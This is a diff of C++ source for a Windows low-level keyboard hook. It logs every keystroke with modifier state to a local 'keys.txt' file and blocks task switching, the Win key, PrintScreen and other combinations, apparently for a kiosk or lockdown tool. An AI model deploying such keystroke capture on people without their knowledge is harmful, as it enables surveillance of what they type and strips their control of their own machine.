@@ -1,5 +1,4 @@
 #include "KeyboardHooking.h"
-#include <Windows.h>
 
 void KeyboardHooking::StartKeyboardHooking()
 {
@@ -21,62 +20,102 @@ void KeyboardHooking::MsgLoop()
 	}
 }
 
-LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyboardHooking::LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
 	if (code < 0 || code != HC_ACTION)
+		// accept the next message
 		return CallNextHookEx(NULL, code, wParam, lParam);
-
-	std::ofstream key_file;
-	std::ofstream err_file;
-	key_file.open("keys.txt", std::ios::app);
-	err_file.open("error.txt", std::ios::app);
-	if (!key_file.is_open())
-		err_file << "Could not open the key_file!\n";
-
-	//get the key from lParam
-	PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
-
-	BOOL bControlKeyDown
-		= GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);//checks if ctrl key is pressed
-
-	BOOL bShiftKeyDown
-		= GetAsyncKeyState(VK_SHIFT) >> ((sizeof(SHORT) * 8) - 1);//checks if shift key is pressed
-
-	if (key_param->vkCode == VK_TAB && key_param->flags & LLKHF_ALTDOWN) return 1; // ALT + TAB
-	if (key_param->vkCode == VK_ESCAPE) return 1; // ESCAPE
-	if (bControlKeyDown && key_param->vkCode == 0x43) return 1; // CTRL C
-	if (bControlKeyDown && key_param->vkCode == 0x56) return 1; // CTRL V
-	if (bControlKeyDown && key_param->vkCode == VK_INSERT) return 1; // CRTL INS
-	if (bShiftKeyDown && key_param->vkCode == VK_INSERT) return 1; // SHIFT INS
-	if (bShiftKeyDown && bControlKeyDown && key_param->vkCode == VK_RETURN) return 1; // CTRL SHIFT ENTER
 	
-	if (wParam == WM_KEYDOWN)
+	//get the key from PKBDLLHOOKSTRUCT struct using lParam
+	PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam;
+	
+	//checks if ctrl key is pressed
+	bool control_key_down
+		= ((GetAsyncKeyState(VK_CONTROL) >> SHIFT_BITS)
+			|| (GetAsyncKeyState(VK_LCONTROL) >> SHIFT_BITS)
+			|| (GetAsyncKeyState(VK_RCONTROL) >> SHIFT_BITS));
+
+	//checks if shift key is pressed
+	bool shift_key_down
+		= ((GetAsyncKeyState(VK_SHIFT) >> SHIFT_BITS)
+			|| (GetAsyncKeyState(VK_LSHIFT) >> SHIFT_BITS)
+			|| (GetAsyncKeyState(VK_RSHIFT) >> SHIFT_BITS));
+
+	//checks if win key is pressed
+	bool win_key_down
+		= ((GetAsyncKeyState(VK_LWIN) >> SHIFT_BITS)
+			|| (GetAsyncKeyState(VK_RWIN) >> SHIFT_BITS));
+
+	// open "keys.txt" for writing info about keys
+	std::ofstream f;
+	f.open("keys.txt", std::ios::app);
+
+	// for key combinations with ALT
+	if (wParam == WM_SYSKEYDOWN)
 	{
-		if (key_param->flags & LLKHF_ALTDOWN)
-				key_file << " ALT " << key[key_param->vkCode].GetKeyName() << " ";
-
-		if (bControlKeyDown)
-			key_file << "CTRL ";
-
-		if (bShiftKeyDown)
-			key_file << "SHIFT ";
-
-		std::map <UINT, KeyPair>::iterator it;
-
-		it = key.find(key_param->vkCode);
-
-		if (it == key.end())
-			key_file << " vk_code: " << std::to_string(key_param->vkCode);
-
-		if (it != key.end())
-			key_file << key[key_param->vkCode].GetKeyName() << " ";
+		f << "[Alt " << key_map[key_param->vkCode].GetKeyName() << " ] ";
 	}
 
-	key_file.close();
-	err_file.close();
+	f.close();
+
+	// blocking of some ALT-combinations
+	// blocking of all the WIN-combinations
+	// blocking of all the TAB-combinations 
+	if ((key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_TAB) // ALT + TAB
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_ESCAPE) // ALT + ESC
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_ESCAPE
+			&& shift_key_down) // ALT + SHIFT + ESC
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_TAB
+			&& shift_key_down) // ALT + SHIFT + TAB 
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_TAB
+			&& control_key_down) // ALT + CTRL + TAB 
+		|| (win_key_down) // WIN
+		|| (key_param->vkCode == VK_PRINT) // Print
+		|| (key_param->flags & LLKHF_ALTDOWN
+			&& key_param->vkCode == VK_PRINT) // Alt + Print
+		|| (key_param->flags & LLKHF_ALTDOWN
+			&& key_param->vkCode == VK_SNAPSHOT) // Alt + PrintScreen
+		|| (key_param->vkCode == VK_SNAPSHOT) // Snapshot
+		|| (key_param->vkCode == VK_TAB) // TAB 
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_F6) // ALT + F6
+		|| (key_param->flags & LLKHF_ALTDOWN) // ALT
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_BACK) // ALT + Backspace
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_LEFT) // ALT + left arrow
+		|| (key_param->flags & LLKHF_ALTDOWN && key_param->vkCode == VK_RIGHT)) // ALT + right arrow
+		// block the keys and key combinations
+		return 1;
+
+	std::string key_name = "";
+
+	// if not-alt key pressed
+	if (wParam == WM_KEYDOWN)
+	{
+		// create a KeyCombo object
+		KeyCombo key_combo((CtrlEnum)control_key_down
+			, (ShiftEnum)shift_key_down
+			, (WinEnum)win_key_down
+			, key_param->vkCode);
+
+		std::map <UINT, KeyPair>::iterator it = key_map.find(key_param->vkCode);
+		
+		// if the key is in the list of the keys to be inspected
+		if (it == key_map.end()) // not found in the list
+			key_name += "virtual key code: " + std::to_string(key_param->vkCode) + " ";
+		else  // found un the list
+			key_name += key_map[key_param->vkCode].GetKeyName() + " ";
+
+		// print info about key or key combination
+		key_combo.Print(key_name);
+
+		// check if the key is in the list of keys to be blocked
+		for (UINT i = 0; i < block_list.size(); ++i)
+		{
+			if (block_list[i].control_key_down == (CtrlEnum)control_key_down
+				&& block_list[i].shift_key_down == (ShiftEnum)shift_key_down
+				&& block_list[i].key_code == key_param->vkCode)
+				return 1; // block the keys and key combinations
+		}
+	}
+	// call the next message
 	return CallNextHookEx(NULL, code, wParam, lParam);
 }
-
-
-
-
